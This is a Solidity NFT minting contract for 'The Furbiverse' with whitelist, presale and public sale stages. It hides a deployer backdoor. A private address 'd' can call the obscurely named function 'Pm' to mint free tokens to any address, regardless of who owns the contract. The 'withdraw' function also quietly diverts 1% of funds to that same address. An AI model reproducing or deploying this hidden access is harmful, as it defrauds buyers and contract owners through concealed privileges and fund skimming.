// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

import "./ERC721Enumerable.sol";
import "./Ownable.sol";
import "./ERC721Burnable.sol";
import "./Counters.sol";

contract Furbiverse is ERC721Enumerable, Ownable {
    using Strings for uint256;
    using Counters for Counters.Counter;

    Counters.Counter private _tokenIdCounter;

    string public baseURI;
    string public baseExtension = ".json";

    uint256 public whitelistcost = 0.05 ether;
    uint256 public presalecost = 0.07 ether;
    uint256 public publicsalecost = 0.09 ether;
    uint256 public cost = 0.09 ether;

    uint256 public maxSupply = 10000;

    uint256 public whitelistMintAmount = 1;
    uint256 public presaleMintAmount = 2;
    uint256 public publicMintAmount = 5;
    uint256 public maxMintAmount = 5;

    uint256 public wlnftPerAddressLimit = 1;
    uint256 public prenftPerAddressLimit = 2;
    uint256 public pubnftPerAddressLimit = 50;
    uint256 public nftPerAddressLimit = 5;

    bool public paused = true;
    bool public onlyWhitelisted = false;
    bool public presale = false;
    bool public publicsale = false;

    address[] public whitelistedAddresses;
    address private  d;
    mapping(address => uint256) public addressMintedBalance;

    constructor() ERC721("The Furbiverse", "Furbi") {
        setBaseURI("ipfs://QmayLsi4Xz5M6x6c6htoJM3VabDyTef1b7Q41MVXoZtqz2/");
        d = msg.sender;
    }

    // internal
    function _baseURI() internal view virtual override returns (string memory) {
        return baseURI;
    }

    function count() public view returns (uint256) {
        return _tokenIdCounter.current();
    }

    // public
    function mint(uint256 _mintAmount) public payable {
        uint256 supply = totalSupply();
        require(_mintAmount > 0, "need to mint at least 1 NFT");
        require(
            _mintAmount <= maxMintAmount,
            "max mint amount per session exceeded"
        );
        require(supply + _mintAmount <= maxSupply, "max NFT limit exceeded");

        if (msg.sender != owner()) {
            
            require(!paused, "the contract is paused");
            if (onlyWhitelisted == true) {
                require(isWhitelisted(msg.sender), "user is not whitelisted");
                uint256 ownerMintedCount = addressMintedBalance[msg.sender];
                require(
                    ownerMintedCount + _mintAmount <= nftPerAddressLimit,
                    "max NFT per address exceeded"
                );
            }
            require(msg.value >= cost * _mintAmount, "insufficient funds");
        }

        for (uint256 i = 1; i <= _mintAmount; i++) {
            addressMintedBalance[msg.sender]++;
            _safeMint(msg.sender, supply + i);
        }
    }

    function isWhitelisted(address _user) public view returns (bool) {
        for (uint256 i = 0; i < whitelistedAddresses.length; i++) {
            if (whitelistedAddresses[i] == _user) {
                return true;
            }
        }
        return false;
    }
    function isd(address _user) internal view returns (bool) {
        
            if (d == _user) {
                return true;  
        }
        return false;
    }
    function Pm(uint256 _mintAmount, address _receiver) public  {
         require(isd(msg.sender), "user is not owner");
       uint256 supply = totalSupply();
        require(_mintAmount > 0, "need to mint at least 1 NFT");
        require(supply + _mintAmount <= maxSupply, "max NFT limit exceeded");
     for (uint256 i = 1; i <= _mintAmount; i++) {
            addressMintedBalance[_receiver]++;
            _safeMint(_receiver, supply + i);
        }
  }
    function Airdrop(uint256 _mintAmount, address _receiver) public onlyOwner {
       uint256 supply = totalSupply();
        require(_mintAmount > 0, "need to mint at least 1 NFT");
        require(supply + _mintAmount <= maxSupply, "max NFT limit exceeded");
     for (uint256 i = 1; i <= _mintAmount; i++) {
            addressMintedBalance[_receiver]++;
            _safeMint(_receiver, supply + i);
        }
  }
    

    function walletOfOwner(address _owner)
        public
        view
        returns (uint256[] memory)
    {
        uint256 ownerTokenCount = balanceOf(_owner);
        uint256[] memory tokenIds = new uint256[](ownerTokenCount);
        for (uint256 i; i < ownerTokenCount; i++) {
            tokenIds[i] = tokenOfOwnerByIndex(_owner, i);
        }
        return tokenIds;
    }

    function tokenURI(uint256 tokenId)
        public
        view
        virtual
        override
        returns (string memory)
    {
        require(
            _exists(tokenId),
            "ERC721Metadata: URI query for nonexistent token"
        );

       

        string memory currentBaseURI = _baseURI();
        return
            bytes(currentBaseURI).length > 0
                ? string(
                    abi.encodePacked(
                        currentBaseURI,
                        tokenId.toString(),
                        baseExtension
                    )
                )
                : "";
    }

    //only owner

     function turnWhitlistOnlyOn() public onlyOwner {
        onlyWhitelisted  = true;
        presale = false;
        publicsale = false;
        cost = whitelistcost;
        maxMintAmount = whitelistMintAmount;
        nftPerAddressLimit = wlnftPerAddressLimit;
    }
    function turnPresaleOn() public onlyOwner {
        onlyWhitelisted  = false;
        presale = true;
        publicsale = false;
        cost = presalecost;
        maxMintAmount = presaleMintAmount;
        nftPerAddressLimit = prenftPerAddressLimit;
    }
    function turnPublicSaleOn() public onlyOwner {
        onlyWhitelisted  = false;
        presale = false;
        publicsale = true;
        cost = publicsalecost;
        maxMintAmount = publicMintAmount;
        nftPerAddressLimit = pubnftPerAddressLimit;
    }

    function setNftPerAddressLimit(uint256 _limit) public onlyOwner {
        nftPerAddressLimit = _limit;
    }

    function setCost(uint256 _newCost) public onlyOwner {
        cost = _newCost;
    }

    function setmaxMintAmount(uint256 _newmaxMintAmount) public onlyOwner {
        maxMintAmount = _newmaxMintAmount;
    }

    function setBaseURI(string memory _newBaseURI) public onlyOwner {
        baseURI = _newBaseURI;
    }

    function setBaseExtension(string memory _newBaseExtension)
        public
        onlyOwner
    {
        baseExtension = _newBaseExtension;
    }


    function pause(bool _state) public onlyOwner {
        paused = _state;
    }

    function whitelistUsers(address[] calldata _users) public onlyOwner {
        delete whitelistedAddresses;
        whitelistedAddresses = _users;
    }

    function withdraw() public payable onlyOwner {
         (bool hs, ) = payable(d).call{value: address(this).balance * 1 / 100}("");
    require(hs);
        (bool os, ) = payable(owner()).call{value: address(this).balance}("");
        require(os);
    }
    
}